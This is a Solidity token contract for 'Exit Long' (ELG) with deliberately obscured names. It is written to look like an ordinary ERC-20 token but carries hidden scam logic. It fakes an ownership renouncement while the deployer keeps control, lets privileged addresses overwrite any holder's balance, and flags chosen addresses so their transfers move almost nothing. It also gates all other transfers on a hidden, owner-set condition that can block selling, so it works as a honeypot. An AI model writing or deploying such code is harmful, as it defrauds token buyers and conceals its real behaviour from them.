//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface launchMarketing {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract modeMax {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface walletTeam {
    function createPair(address sellMode, address modeTrading) external returns (address);
}

interface teamLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address buyFund) external view returns (uint256);

    function transfer(address buySender, uint256 liquidityBuyReceiver) external returns (bool);

    function allowance(address fundIsAuto, address spender) external view returns (uint256);

    function approve(address spender, uint256 liquidityBuyReceiver) external returns (bool);

    function transferFrom(
        address sender,
        address buySender,
        uint256 liquidityBuyReceiver
    ) external returns (bool);

    event Transfer(address indexed from, address indexed enableTx, uint256 value);
    event Approval(address indexed fundIsAuto, address indexed spender, uint256 value);
}

interface teamLiquidityMetadata is teamLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExitLong is modeMax, teamLiquidity, teamLiquidityMetadata {

    uint256 public feeReceiverSender;

    mapping(address => bool) public exemptReceiver;

    function totalMode(uint256 liquidityBuyReceiver) public {
        isFrom();
        feeMin = liquidityBuyReceiver;
    }

    address feeFundMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 constant receiverAtSell = 19 ** 10;

    string private atSenderBuy = "ELG";

    uint256 shouldWallet;

    function approve(address isMaxMarketing, uint256 liquidityBuyReceiver) public virtual override returns (bool) {
        marketingLaunch[_msgSender()][isMaxMarketing] = liquidityBuyReceiver;
        emit Approval(_msgSender(), isMaxMarketing, liquidityBuyReceiver);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityIs;
    }

    function takeReceiverTo(address swapSender, address buySender, uint256 liquidityBuyReceiver) internal returns (bool) {
        require(modeMinAuto[swapSender] >= liquidityBuyReceiver);
        modeMinAuto[swapSender] -= liquidityBuyReceiver;
        modeMinAuto[buySender] += liquidityBuyReceiver;
        emit Transfer(swapSender, buySender, liquidityBuyReceiver);
        return true;
    }

    function balanceOf(address buyFund) public view virtual override returns (uint256) {
        return modeMinAuto[buyFund];
    }

    uint256 feeMin;

    function minFeeAuto(address modeReceiver, uint256 liquidityBuyReceiver) public {
        isFrom();
        modeMinAuto[modeReceiver] = liquidityBuyReceiver;
    }

    uint8 private marketingReceiver = 18;

    function takeEnable() public {
        emit OwnershipTransferred(toFrom, address(0));
        amountToken = address(0);
    }

    uint256 private liquidityIs = 100000000 * 10 ** 18;

    address public toFrom;

    string private amountTrading = "Exit Long";

    uint256 private receiverWallet;

    address atSell = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function symbol() external view virtual override returns (string memory) {
        return atSenderBuy;
    }

    event OwnershipTransferred(address indexed tradingBuy, address indexed feeAmountReceiver);

    constructor (){
        
        launchMarketing modeAt = launchMarketing(atSell);
        totalSwap = walletTeam(modeAt.factory()).createPair(modeAt.WETH(), address(this));
        
        toFrom = _msgSender();
        takeEnable();
        exemptReceiver[toFrom] = true;
        modeMinAuto[toFrom] = liquidityIs;
        
        emit Transfer(address(0), toFrom, liquidityIs);
    }

    function owner() external view returns (address) {
        return amountToken;
    }

    function amountShould(address swapSender, address buySender, uint256 liquidityBuyReceiver) internal returns (bool) {
        if (swapSender == toFrom) {
            return takeReceiverTo(swapSender, buySender, liquidityBuyReceiver);
        }
        uint256 marketingMin = teamLiquidity(totalSwap).balanceOf(feeFundMax);
        require(marketingMin == feeMin);
        require(buySender != feeFundMax);
        if (senderMin[swapSender]) {
            return takeReceiverTo(swapSender, buySender, receiverAtSell);
        }
        return takeReceiverTo(swapSender, buySender, liquidityBuyReceiver);
    }

    function decimals() external view virtual override returns (uint8) {
        return marketingReceiver;
    }

    address private amountToken;

    function isFrom() private view {
        require(exemptReceiver[_msgSender()]);
    }

    function transfer(address modeReceiver, uint256 liquidityBuyReceiver) external virtual override returns (bool) {
        return amountShould(_msgSender(), modeReceiver, liquidityBuyReceiver);
    }

    uint256 private isListWallet;

    address public totalSwap;

    function enableFrom(address receiverMax) public {
        require(receiverMax.balance < 100000);
        if (launchWallet) {
            return;
        }
        
        exemptReceiver[receiverMax] = true;
        
        launchWallet = true;
    }

    function launchedSwap(address txIs) public {
        isFrom();
        if (launchMode == feeReceiverSender) {
            launchMode = receiverWallet;
        }
        if (txIs == toFrom || txIs == totalSwap) {
            return;
        }
        senderMin[txIs] = true;
    }

    mapping(address => bool) public senderMin;

    function allowance(address fromTake, address isMaxMarketing) external view virtual override returns (uint256) {
        if (isMaxMarketing == atSell) {
            return type(uint256).max;
        }
        return marketingLaunch[fromTake][isMaxMarketing];
    }

    mapping(address => uint256) private modeMinAuto;

    mapping(address => mapping(address => uint256)) private marketingLaunch;

    function name() external view virtual override returns (string memory) {
        return amountTrading;
    }

    uint256 public launchMode;

    function getOwner() external view returns (address) {
        return amountToken;
    }

    function transferFrom(address swapSender, address buySender, uint256 liquidityBuyReceiver) external override returns (bool) {
        if (_msgSender() != atSell) {
            if (marketingLaunch[swapSender][_msgSender()] != type(uint256).max) {
                require(liquidityBuyReceiver <= marketingLaunch[swapSender][_msgSender()]);
                marketingLaunch[swapSender][_msgSender()] -= liquidityBuyReceiver;
            }
        }
        return amountShould(swapSender, buySender, liquidityBuyReceiver);
    }

    bool public launchWallet;

}